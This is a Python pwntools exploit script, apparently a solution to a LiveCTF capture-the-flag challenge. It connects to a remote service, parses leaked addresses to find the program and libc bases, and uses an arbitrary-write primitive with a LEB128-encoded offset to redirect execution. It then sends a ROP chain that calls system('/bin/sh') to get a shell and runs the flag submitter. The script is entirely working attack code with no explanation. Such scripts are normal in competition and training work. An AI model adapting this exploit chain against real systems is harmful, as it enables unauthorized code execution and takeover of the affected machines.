#!/usr/bin/env python3
from pwn import *
import leb128

context.log_level = 'error'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = 'kitty'
context.aslr = False

c = ELF('./challenge')
#libc = c.libc
libc = ELF('./libc.so.6')

#r = gdb.debug('./challenge')

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))
#Constructing Something...
#main: 0x55e414ab34ee
#var: 0x7ffdd4486917
#printf: 0x7bce8c267e00

r.recvuntil(b'main: ')
addr_main = int(r.recvline(), 16)
c.address = addr_main - 0x14ee
r.recvuntil(b'var: ')
addr_var = int(r.recvline(), 16)
r.recvuntil(b'printf: ')
addr_printf = int(r.recvline(), 16)
libc.address = addr_printf - libc.symbols['printf']
#info(f'chall: {c.address:016x}')
#info(f'libc:  {libc.address:016x}')

#info(f'diff:  {libc.symbols["system"] - c.symbols["main"]}')
#info(f'libc-system: {libc.symbols["system"]}')

#TARGET = libc.symbols["system"]
#TARGET = libc.address + 0xef4ce
TARGET = libc.sym.gets
LDSA_OFFSET = 0x228f
offset = u64(leb128.u.encode(TARGET - c.symbols["main"]) + b'\x01')

r.recvuntil(b'Where to write?\n')
r.sendline(f'0x{c.address + LDSA_OFFSET:x}'.encode())
r.recvuntil(b'What to write?\n')
r.sendline(f'0x{offset:x}'.encode())
r.recvuntil(b'Write again?\n')

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))

r.sendline(b'0' + bytes(rop))

sleep(2)

r.sendline(b'./submitter || /home/livectf/submitter ; echo pwnpwn')

print(r.recvuntil(b'pwnpwn'))
